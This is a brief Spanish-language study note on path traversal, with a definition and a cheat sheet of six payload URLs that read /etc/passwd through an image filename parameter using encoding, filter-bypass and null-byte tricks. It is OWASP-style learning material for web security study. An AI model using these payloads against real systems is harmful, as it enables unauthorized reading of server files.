
-------------------------
- Tags: #owasp #web  #vuln 
----------------------------
# Definicion:

El _**path traversal**, **directory traversal**_ o, en español, **salto de directorios**.
- Es una técnica de hacking web que permite acceder a ficheros de la aplicación para los cuales no se debería tener autorización.

## CheatSheet

- *Simple*
``` url
http:/domain/image?filename=../../../../../..//etc/passwd
```

- *Absolute path*
``` url
http:/domain/image?filename=/etc/passwd
```

- *Secuence Bloqued*
``` url
http:/domain/image?filename=....//....//....//....//....//....//etc/passwd
```

- *Url Encoded*
``` url
http:/domain/image?filename=..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd 
```

- *Forced Path Valdiate*
``` url
http:/domain/image?filename=/var/www/images/../../../../../../../etc/passwd
```

- *Extension Validation - Null Byte Bypass*
``` url
http:/domain/image?filename=../../../../../../etc/passwd%00.jpg
```